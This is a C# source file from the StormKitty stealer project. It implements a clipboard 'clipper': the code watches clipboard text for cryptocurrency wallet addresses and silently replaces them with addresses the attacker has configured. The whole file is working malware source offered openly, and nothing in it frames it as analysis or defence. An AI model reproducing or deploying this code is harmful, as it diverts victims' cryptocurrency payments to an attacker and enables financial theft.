/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Clipper
{
    internal sealed class Clipper
    {
        // Find & Replace crypto addresses in clipboard
        public static void Replace()
        {
            string buffer = StormKitty.ClipboardManager.ClipboardText;
            if (string.IsNullOrEmpty(buffer))
                return;
            foreach (KeyValuePair<string, Regex> dictonary in RegexPatterns.PatternsList)
            {
                string cryptocurrency = dictonary.Key;
                Regex pattern = dictonary.Value;
                if (pattern.Match(buffer).Success)
                {
                    string replace_to = StormKitty.Config.ClipperAddresses[cryptocurrency];
                    if (!string.IsNullOrEmpty(replace_to) && !buffer.Equals(replace_to))
                    {
                        Clipboard.SetText(replace_to);
                        System.Console.WriteLine("Clipper replaced to " + replace_to);
                        return;
                    }
                }
            }
        }
    }
}
